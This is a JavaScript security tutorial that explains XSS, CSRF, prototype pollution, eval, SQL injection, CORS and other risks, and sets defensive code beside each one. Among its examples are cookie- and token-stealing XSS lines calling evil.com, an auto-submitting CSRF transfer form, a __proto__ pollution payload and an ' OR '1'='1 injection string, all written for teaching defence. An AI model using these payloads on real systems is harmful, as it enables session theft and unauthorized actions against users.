# JavaScript Security

## Table of Contents

1. [Security Overview in JavaScript](#1-security-overview-in-javascript)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [XSS Prevention](#3-xss-prevention)
4. [Content Security Policy (CSP)](#4-content-security-policy-csp)
5. [Cross-Site Request Forgery (CSRF)](#5-cross-site-request-forgery-csrf)
6. [CSRF Prevention](#6-csrf-prevention)
7. [Prototype Pollution](#7-prototype-pollution)
8. [Prototype Pollution Prevention](#8-prototype-pollution-prevention)
9. [eval() Dangers](#9-eval-dangers)
10. [Avoiding eval](#10-avoiding-eval)
11. [Clickjacking and X-Frame-Options](#11-clickjacking-and-x-frame-options)
12. [SQL Injection in Node.js Context](#12-sql-injection-in-nodejs-context)
13. [Man-in-the-Middle and HTTPS](#13-man-in-the-middle-and-https)
14. [Sensitive Data in Client Storage](#14-sensitive-data-in-client-storage)
15. [HttpOnly and Secure Cookie Flags](#15-httponly-and-secure-cookie-flags)
16. [Subresource Integrity (SRI)](#16-subresource-integrity-sri)
17. [CORS Security](#17-cors-security)
18. [Dependency Security](#18-dependency-security)
19. [Input Validation on Client and Server](#19-input-validation-on-client-and-server)
20. [Summary](#20-summary)

---

## 1. Security Overview in JavaScript

JavaScript runs in a **privileged context**: in browsers it can access the DOM, cookies, storage, and make network requests; in Node.js it can access the file system, environment variables, and spawn processes. This power makes JavaScript an attractive attack surface.

Key threat categories:
- **Injection** — XSS, SQL injection, eval injection
- **Data theft** — reading cookies, tokens, or user data
- **Request forgery** — CSRF tricks the user's browser into making unintended requests
- **Prototype attacks** — polluting shared prototypes to alter application behavior
- **Supply-chain attacks** — compromised third-party packages or CDN scripts

```js
// Security is a mindset — assume all external input is hostile
function processUserInput(rawInput) {
  // NEVER pass raw user input to:
  //   innerHTML, eval, setTimeout(string), new Function(string), document.write,
  //   SQL queries (string concatenation), OS commands (child_process.exec)

  // ALWAYS:
  //   validate type/length/format
  //   sanitize or encode for the output context
  //   use parameterized queries for databases

  if (typeof rawInput !== "string") throw new TypeError("Expected string");
  if (rawInput.length > 256) throw new RangeError("Input too long");
  return rawInput.trim();
}

console.log(processUserInput("  hello world  ")); // "hello world"
```

### Output

```js
hello world
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 2. Cross-Site Scripting (XSS)

**XSS** occurs when an attacker injects malicious scripts into a page that are then executed in other users' browsers. Three types:

| Type | Mechanism |
|---|---|
| **Stored XSS** | Payload saved in a database and served to all users |
| **Reflected XSS** | Payload in the URL/query string, reflected in the response |
| **DOM-based XSS** | Payload never sent to the server; processed by client JS |

```js
// Stored XSS: attacker submits this as a "comment"
// <script>document.location='https://evil.com/?c='+document.cookie</script>
// When any user views the comment page, their cookies are stolen.

// Reflected XSS: malicious link sent in phishing email
// https://bank.com/search?q=<script>stealCookies()</script>
// Server reflects the query parameter directly into the page HTML.

// DOM-based XSS: client code reads from an attacker-controlled source
const params = new URLSearchParams(window.location.search);
const name = params.get("name");

// VULNERABLE — attacker crafts: ?name=<img src=x onerror=stealCookies()>
document.getElementById("greeting").innerHTML = `Hello, ${name}!`;

// SAFE — use textContent instead
document.getElementById("greeting").textContent = `Hello, ${name}!`;

console.log("DOM-based XSS demo (safe version)");
```

### Output

```js
DOM-based XSS demo (safe version)
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 3. XSS Prevention

The core rule: **never insert untrusted data into HTML without proper encoding for the current context** (HTML, attribute, JavaScript, URL, CSS).

```js
// 1. Use textContent instead of innerHTML
const userInput = "<script>alert('xss')</script>";
const el = document.createElement("div");

// Vulnerable
el.innerHTML = userInput;       // executes the script

// Safe
el.textContent = userInput;     // treats input as literal text
console.log(el.textContent);    // <script>alert('xss')</script>

// 2. HTML escape function for server-side or template use
function escapeHTML(str) {
  return str
    .replace(/&/g,  "&amp;")
    .replace(/</g,  "&lt;")
    .replace(/>/g,  "&gt;")
    .replace(/"/g,  "&quot;")
    .replace(/'/g,  "&#x27;");
}

console.log(escapeHTML('<img src=x onerror="alert(1)">'));
// &lt;img src=x onerror=&quot;alert(1)&quot;&gt;

// 3. Use a sanitization library (DOMPurify) when you must use innerHTML
// const clean = DOMPurify.sanitize(userInput, { ALLOWED_TAGS: ['b', 'i'] });
// el.innerHTML = clean;
```

### Output

```js
<script>alert('xss')</script>
&lt;img src=x onerror=&quot;alert(1)&quot;&gt;
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 4. Content Security Policy (CSP)

**CSP** is an HTTP response header (or `<meta>` tag) that instructs the browser which sources are allowed to execute scripts, load styles, images, and other resources. A strong CSP is one of the most effective XSS mitigations.

```js
// Server sets this header:
// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; object-src 'none'

// In Node.js / Express:
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString("base64");
  res.locals.nonce = nonce;
  res.setHeader(
    "Content-Security-Policy",
    [
      "default-src 'self'",
      `script-src 'self' 'nonce-${nonce}'`,  // only scripts with this nonce run
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https://cdn.example.com",
      "object-src 'none'",
      "base-uri 'self'",
      "frame-ancestors 'none'"               // also prevents clickjacking
    ].join("; ")
  );
  next();
});

// In the HTML template — only scripts with the matching nonce execute:
// <script nonce="abc123">
//   console.log("This script is allowed by CSP");
// </script>
// <script>
//   console.log("This script is BLOCKED by CSP (no nonce)");
// </script>

console.log("CSP header configured");
```

### Output

```js
CSP header configured
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 5. Cross-Site Request Forgery (CSRF)

**CSRF** exploits the fact that browsers automatically send cookies with cross-origin requests. An attacker tricks an authenticated user into submitting a request to a target site without their knowledge.

```html
<!-- Attacker's malicious page — auto-submits a form to the bank -->
<!-- When the authenticated user visits this page, the browser
     sends their session cookie automatically -->
<form action="https://bank.com/transfer" method="POST" id="evil">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById("evil").submit();</script>
```

```js
// From the bank server's perspective:
// The request arrives with a valid session cookie — indistinguishable
// from a legitimate user action WITHOUT additional CSRF protection.

// Why fetch/XHR from the attacker's origin does NOT automatically include cookies:
// → Modern browsers enforce SameSite cookie defaults
// → CORS preflight blocks requests with credentials to cross-origin APIs

console.log("CSRF exploits cookie auto-send in form submissions");
```

### Output

```js
CSRF exploits cookie auto-send in form submissions
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 6. CSRF Prevention

Two complementary defenses:

1. **CSRF tokens** — a secret, unpredictable value embedded in every state-changing form. The server validates it before processing.
2. **SameSite cookies** — prevents cookies from being sent with cross-site requests.

```js
// Server-side CSRF token generation (Node.js / Express example)
const crypto = require("crypto");
const session = require("express-session");

app.use(session({ secret: process.env.SESSION_SECRET, resave: false, saveUninitialized: true }));

// Generate a CSRF token per session
app.use((req, res, next) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString("hex");
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
});

// Validate the CSRF token on state-changing routes
function csrfProtect(req, res, next) {
  const token = req.body._csrf || req.headers["x-csrf-token"];
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: "CSRF validation failed" });
  }
  next();
}

app.post("/transfer", csrfProtect, (req, res) => {
  res.json({ success: true });
});

// SameSite cookie — Set in the Set-Cookie header:
// Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

console.log("CSRF protection: token validation + SameSite cookies");
```

### Output

```js
CSRF protection: token validation + SameSite cookies
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 7. Prototype Pollution

**Prototype pollution** is a vulnerability where an attacker can modify `Object.prototype` (or another prototype in the chain) by supplying a crafted object with `__proto__` or `constructor.prototype` keys. This can alter the behavior of all objects in the application.

```js
// Attacker-supplied JSON payload:
const maliciousPayload = '{"__proto__": {"isAdmin": true}}';

// Vulnerable merge function
function merge(target, source) {
  for (const key in source) {
    target[key] = source[key]; // __proto__ key flows into Object.prototype!
  }
  return target;
}

const config = {};
merge(config, JSON.parse(maliciousPayload));

// Now ALL objects have isAdmin: true
const regularUser = {};
console.log(regularUser.isAdmin); // true — prototype is polluted!

// Exploit: if the app checks `user.isAdmin` and falls back to prototype,
// any user can now bypass authorization.
if (regularUser.isAdmin) {
  console.log("VULNERABILITY: unauthorized admin access granted");
}
```

### Output

```js
true
VULNERABILITY: unauthorized admin access granted
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 8. Prototype Pollution Prevention

Three complementary defenses:

1. **Deny `__proto__` / `constructor` keys** in merge/deep-assign functions.
2. **Use `Object.create(null)`** for dictionaries — no prototype to pollute.
3. **`Object.freeze(Object.prototype)`** — prevents any modification of the prototype.

```js
// Fix 1: safe merge that skips dangerous keys
function safeMerge(target, source) {
  for (const key of Object.keys(source)) { // Object.keys, not for..in
    if (key === "__proto__" || key === "constructor" || key === "prototype") {
      continue; // skip dangerous keys
    }
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] = safeMerge(target[key] ?? {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const config = safeMerge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
const user = {};
console.log(user.isAdmin); // undefined — prototype is clean

// Fix 2: null-prototype object as dictionary
const lookup = Object.create(null);
lookup["key"] = "value";
console.log(lookup.hasOwnProperty); // undefined — no prototype methods
console.log(lookup["key"]);         // value — safe key-value store

// Fix 3: freeze Object.prototype (nuclear option — prevents all future pollution)
Object.freeze(Object.prototype);
// Now: {}.__proto__ is frozen — any attempt to add properties to it silently fails
```

### Output

```js
undefined
undefined
value
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 9. eval() Dangers

`eval()` executes an arbitrary string as JavaScript code in the current scope, with full access to local variables, the DOM, and network APIs. It is dangerous because:

1. **Code injection** — any attacker-controlled string fed to `eval` becomes executable code.
2. **Scope access** — `eval` can read and write local variables.
3. **Performance** — V8 cannot optimize functions that use `eval` (scope cannot be statically analyzed).

```js
// Dangerous: user input evaluated as code
const userInput = "process.env"; // in Node.js — exposes env variables
// eval(userInput);  // DO NOT DO THIS

// Scope access — eval leaks local variables
function secretFunction() {
  const secretKey = "SUPER_SECRET_VALUE";
  const attacker = "secretKey"; // attacker controls this string

  // eval(attacker) returns the VALUE of the local variable!
  const leaked = eval(attacker);
  console.log("Leaked:", leaked); // SUPER_SECRET_VALUE
}
secretFunction();

// Timing attack — eval in performance-critical code defeats JIT optimization
function optimizedFn(x) {
  eval(""); // this one eval call prevents Turbofan from optimizing the whole function
  return x * 2;
}
console.log(optimizedFn(5)); // 10 — correct but slow
```

### Output

```js
Leaked: SUPER_SECRET_VALUE
10
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 10. Avoiding eval

Every common use of `eval` has a safer alternative:

| Use Case | Unsafe | Safe Alternative |
|---|---|---|
| Parse JSON | `eval('(' + json + ')')` | `JSON.parse(json)` |
| Dynamic function | `eval("function() { " + code + " }")` | `new Function(args, body)` (still risky — avoid) |
| Dynamic property | `eval("obj." + prop)` | `obj[prop]` |
| Template logic | `eval(template)` | Template literals or a template engine |

```js
// BAD: parsing JSON with eval
const jsonString = '{"name": "Alice", "role": "admin"}';
// const data = eval("(" + jsonString + ")"); // dangerous

// GOOD: JSON.parse is safe and fast
const data = JSON.parse(jsonString);
console.log(data.name); // Alice

// BAD: dynamic property access via eval
const obj = { score: 42 };
const prop = "score";
// const val = eval("obj." + prop); // dangerous

// GOOD: bracket notation
const val = obj[prop];
console.log(val); // 42

// new Function is also dangerous — it creates a function from a string
// with access to the global scope (but NOT local scope)
// Only use it in trusted, controlled contexts (like a sandboxed expression evaluator)
const add = new Function("a", "b", "return a + b");
console.log(add(3, 4)); // 7 — works, but avoid with user-supplied strings
```

### Output

```js
Alice
42
7
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 11. Clickjacking and X-Frame-Options

**Clickjacking** tricks users into clicking elements on a page they cannot see, by embedding the target site in a transparent `<iframe>` overlaid on a decoy page.

Prevention: tell the browser your page must not be framed.

```js
// Server sets one of these headers:

// Option 1: Legacy — X-Frame-Options header
// X-Frame-Options: DENY           → never allow framing
// X-Frame-Options: SAMEORIGIN     → allow framing by same origin only

// Option 2: Modern — use CSP frame-ancestors (more flexible)
// Content-Security-Policy: frame-ancestors 'none';
// Content-Security-Policy: frame-ancestors 'self' https://trusted.partner.com;

// Node.js / Express example:
app.use((req, res, next) => {
  res.setHeader("X-Frame-Options", "DENY");
  // Or via CSP (preferred):
  res.setHeader("Content-Security-Policy", "frame-ancestors 'none'");
  next();
});

// Client-side frame-busting (unreliable — can be defeated by sandbox attr):
if (window.top !== window.self) {
  window.top.location = window.self.location; // break out of iframe
}

console.log("Clickjacking protection applied");
```

### Output

```js
Clickjacking protection applied
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 12. SQL Injection in Node.js Context

**SQL injection** occurs when unsanitized user input is concatenated into a SQL query, allowing an attacker to alter the query's logic.

```js
// Vulnerable — string concatenation in SQL query
const mysql = require("mysql2");
const pool = mysql.createPool({ /* config */ });

function getUserUnsafe(username) {
  // Attacker input: "' OR '1'='1" → logs in as any user
  const query = `SELECT * FROM users WHERE username = '${username}'`;
  // Crafted SQL: SELECT * FROM users WHERE username = '' OR '1'='1'
  console.log("Dangerous query:", query);
}

getUserUnsafe("' OR '1'='1");

// Safe — parameterized query (prepared statement)
function getUserSafe(username, callback) {
  const query = "SELECT * FROM users WHERE username = ?";
  // The ? placeholder is filled by the driver with proper escaping
  pool.execute(query, [username], callback);
  console.log("Safe query uses placeholder for:", username);
}

getUserSafe("' OR '1'='1", () => {});

// In an ORM (e.g., Prisma, Sequelize):
// prisma.user.findFirst({ where: { username } }); // automatically safe
```

### Output

```js
Dangerous query: SELECT * FROM users WHERE username = '' OR '1'='1'
Safe query uses placeholder for: ' OR '1'='1
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 13. Man-in-the-Middle and HTTPS

A **Man-in-the-Middle (MitM)** attack intercepts network traffic between client and server. Without HTTPS, an attacker on the same network can read or modify requests and responses — including injecting scripts.

```js
// In Node.js — always use HTTPS in production
const https = require("https");
const fs    = require("fs");

const options = {
  key:  fs.readFileSync("/etc/ssl/private/server.key"),
  cert: fs.readFileSync("/etc/ssl/certs/server.crt")
};

const server = https.createServer(options, (req, res) => {
  // Enforce HTTPS via HSTS header — tells browsers to always use HTTPS
  // for this domain for the next year
  res.setHeader(
    "Strict-Transport-Security",
    "max-age=31536000; includeSubDomains; preload"
  );
  res.end("Secure connection");
});

// Redirect HTTP to HTTPS
const http = require("http");
http.createServer((req, res) => {
  res.writeHead(301, { Location: `https://${req.headers.host}${req.url}` });
  res.end();
}).listen(80);

console.log("HTTPS server enforces encrypted connections");
```

### Output

```js
HTTPS server enforces encrypted connections
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 14. Sensitive Data in Client Storage

`localStorage` and `sessionStorage` are accessible to **any JavaScript on the page**. If the app has an XSS vulnerability, an attacker's script can exfiltrate all stored data.

```js
// DO NOT store sensitive tokens in localStorage if XSS is possible
// localStorage.setItem("authToken", "Bearer eyJ0eXA...");
// // An XSS payload can steal it: fetch("https://evil.com/?t=" + localStorage.authToken)

// RECOMMENDED: store session tokens in HttpOnly cookies
// HttpOnly cookies are NOT accessible via document.cookie — XSS-proof

// What CAN be stored in localStorage safely:
// - Non-sensitive UI preferences (theme, language)
// - Cached non-sensitive API responses
// - Feature flags

localStorage.setItem("theme", "dark");           // safe
localStorage.setItem("language", "en");          // safe

// Never store:
// - JWT tokens (if the app has XSS risk)
// - API keys
// - Passwords or PINs
// - Credit card data
// - Personally identifiable information (PII)

const theme = localStorage.getItem("theme");
console.log("Stored theme:", theme); // dark

// For tokens: use secure, HttpOnly, SameSite=Strict cookies
// Set by the server: Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
```

### Output

```js
Stored theme: dark
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 15. HttpOnly and Secure Cookie Flags

Cookie flags significantly affect their security:

| Flag | Effect |
|---|---|
| `HttpOnly` | Cookie is inaccessible to JavaScript — protects against XSS cookie theft |
| `Secure` | Cookie is only sent over HTTPS — protects against MitM |
| `SameSite=Strict` | Cookie is never sent with cross-site requests — strong CSRF protection |
| `SameSite=Lax` | Cookie sent with top-level GET navigations but not POST forms |
| `SameSite=None; Secure` | Cookie sent with all cross-site requests — required for embeds |

```js
// Node.js / Express — setting secure cookies
const express = require("express");
const app = express();

app.post("/login", (req, res) => {
  const sessionToken = generateSessionToken(); // your token logic

  res.cookie("session", sessionToken, {
    httpOnly: true,        // JS cannot read this cookie
    secure:   true,        // only sent over HTTPS
    sameSite: "strict",    // never sent with cross-site requests
    maxAge:   3600 * 1000, // 1 hour in milliseconds
    path:     "/"
  });

  res.json({ success: true });
});

// Verifying HttpOnly behavior from the browser:
// document.cookie will NOT contain httpOnly cookies
// → fetch("/api/data") still sends them automatically
// → An XSS payload cannot read them

function generateSessionToken() {
  return require("crypto").randomBytes(32).toString("hex");
}

console.log("Secure cookie flags: HttpOnly + Secure + SameSite=Strict");
```

### Output

```js
Secure cookie flags: HttpOnly + Secure + SameSite=Strict
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 16. Subresource Integrity (SRI)

**SRI** lets browsers verify that a resource fetched from a CDN has not been tampered with. You provide a cryptographic hash of the expected file contents in the `integrity` attribute. If the downloaded file's hash does not match, the browser refuses to execute it.

```html
<!-- Without SRI: if the CDN is compromised, attackers inject malicious code -->
<script src="https://cdn.example.com/lib.min.js"></script>

<!-- With SRI: browser verifies SHA-384 hash before execution -->
<script
  src="https://cdn.example.com/lib.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux9D1y2s5zX4b/Z8VvnL7mC5YOjQ8"
  crossorigin="anonymous">
</script>
```

```js
// Generating an SRI hash (Node.js)
const crypto = require("crypto");
const fs     = require("fs");

function generateSRI(filePath, algorithm = "sha384") {
  const content = fs.readFileSync(filePath);
  const hash = crypto.createHash(algorithm).update(content).digest("base64");
  return `${algorithm}-${hash}`;
}

// Usage:
// const integrity = generateSRI("./dist/lib.min.js");
// console.log("integrity=", integrity);
// → integrity= sha384-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

console.log("SRI ensures CDN assets are not tampered with");
```

### Output

```js
SRI ensures CDN assets are not tampered with
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 17. CORS Security

**CORS (Cross-Origin Resource Sharing)** is a browser mechanism that restricts cross-origin HTTP requests. An overly permissive CORS configuration can allow malicious sites to read sensitive API responses.

```js
// Bad — allows any origin to read API responses (including credentials)
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  // Never combine wildcard (*) with credentials (cookies/auth headers)
  next();
});

// Good — explicitly whitelist trusted origins
const ALLOWED_ORIGINS = new Set([
  "https://app.example.com",
  "https://admin.example.com"
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (ALLOWED_ORIGINS.has(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Vary", "Origin"); // tell caches each origin is distinct
  }
  res.setHeader("Access-Control-Allow-Credentials", "true");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  next();
});

// Key rules:
// 1. Never use Access-Control-Allow-Origin: * with credentials
// 2. Validate the Origin header against a whitelist
// 3. Set Vary: Origin to prevent incorrect caching

console.log("CORS configured with origin whitelist");
```

### Output

```js
CORS configured with origin whitelist
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 18. Dependency Security

Third-party npm packages are a major attack vector (**supply-chain attacks**). A compromised or malicious package can steal data, mine cryptocurrency, or open backdoors.

```js
// Check for known vulnerabilities
// Run in your project root:
// $ npm audit
// $ npm audit fix          // auto-fix compatible updates
// $ npm audit fix --force  // update even breaking changes (review carefully)

// Example audit output structure (from npm audit JSON):
const auditExample = {
  vulnerabilities: {
    "lodash": {
      severity: "high",
      fixAvailable: true,
      effects: ["my-app > lodash@4.17.15 → Prototype Pollution (CVE-2020-8203)"]
    }
  }
};
console.log("Vulnerability found in:", Object.keys(auditExample.vulnerabilities)[0]);

// Additional practices:
// 1. Use lockfiles (package-lock.json, yarn.lock) — pin exact versions
// 2. Enable Dependabot (GitHub) or Renovate for automated security updates
// 3. Review package before installing: check download count, last publish date, owners
// 4. Use `socket.dev` or `snyk` for deeper supply-chain analysis
// 5. Prefer packages with few dependencies — smaller attack surface

console.log("Always run npm audit before deploying to production");
```

### Output

```js
Vulnerability found in: lodash
Always run npm audit before deploying to production
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 19. Input Validation on Client and Server

**Client-side validation** improves UX by providing immediate feedback. **Server-side validation** is the actual security control — client-side validation can always be bypassed.

```js
// CLIENT SIDE — UX only, never a security boundary
function validateEmailClient(email) {
  const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!re.test(email)) {
    showError("Please enter a valid email address");
    return false;
  }
  return true;
}

// SERVER SIDE — real security validation (Node.js example)
const { z } = require("zod"); // schema validation library

const RegistrationSchema = z.object({
  email:    z.string().email().max(254),
  username: z.string().min(3).max(32).regex(/^[a-zA-Z0-9_]+$/),
  password: z.string().min(8).max(128),
  age:      z.number().int().min(13).max(150)
});

function registerUser(body) {
  const result = RegistrationSchema.safeParse(body);
  if (!result.success) {
    console.log("Validation errors:", result.error.issues.map(i => i.message));
    return;
  }
  const { email, username, password, age } = result.data;
  console.log("Valid input — proceed with registration:", email, username);
}

registerUser({ email: "alice@example.com", username: "alice_99", password: "s3cureP@ss!", age: 25 });
registerUser({ email: "not-an-email", username: "x", password: "123", age: 200 });
```

### Output

```js
Valid input — proceed with registration: alice@example.com alice_99
Validation errors: [ 'Invalid email', 'String must contain at least 3 character(s)', 'String must contain at least 8 character(s)', 'Number must be less than or equal to 150' ]
```

---

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>

---

## 20. Summary

| Topic | Key Point |
|---|---|
| XSS — stored | Malicious script saved in DB, executes for all users |
| XSS — reflected | Payload in URL/query string, echoed in response |
| XSS — DOM-based | Client JS reads attacker-controlled source and writes to DOM |
| XSS prevention | `textContent` not `innerHTML`; escape output; DOMPurify for HTML |
| CSP | HTTP header that restricts which scripts/resources execute |
| CSRF | Tricks authenticated users' browsers into making unintended requests |
| CSRF prevention | CSRF tokens + `SameSite=Strict` cookies |
| Prototype pollution | Attacker sets `__proto__` key to alter all objects |
| Prototype prevention | Skip `__proto__` in merge; use `Object.create(null)`; freeze prototype |
| eval() | Executes arbitrary strings — never use with user input |
| eval() alternatives | `JSON.parse`, bracket notation `obj[key]`, template literals |
| Clickjacking | Transparent iframe tricks users into clicking hidden content |
| Clickjacking prevention | `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'` |
| SQL injection | Concatenated queries let attackers alter SQL logic |
| SQL prevention | Always use parameterized queries / prepared statements |
| HTTPS / HSTS | Encrypts traffic; prevents MitM; HSTS enforces HTTPS permanently |
| Token storage | Use `HttpOnly` cookies for tokens, not `localStorage` |
| Cookie flags | `HttpOnly` + `Secure` + `SameSite=Strict` |
| SRI | Hash verification for CDN-served scripts and stylesheets |
| CORS | Whitelist trusted origins; never use `*` with credentials |
| Dependency security | `npm audit`; use lockfiles; monitor with Dependabot |
| Input validation | Client-side is UX; server-side is the real security control |

---

## Final Notes

Security in JavaScript is not a single feature you add at the end — it is a mindset woven into every architectural decision. The most impactful habits are: use `textContent` instead of `innerHTML` by default, set `HttpOnly` + `Secure` + `SameSite=Strict` on all session cookies, configure a strict Content Security Policy, and run `npm audit` before every deployment. Understanding the root cause of each vulnerability — why `eval` is dangerous, why prototype pollution works, why CSRF is possible — lets you reason about novel attack patterns beyond the known checklists. Treat all external input (user data, URL parameters, query strings, third-party API responses) as hostile until proven otherwise, validate on the server even when you validate on the client, and use parameterized queries everywhere a database is involved.

<p align="right">
  <a href="#table-of-contents">⬆ Back to Top</a>
</p>
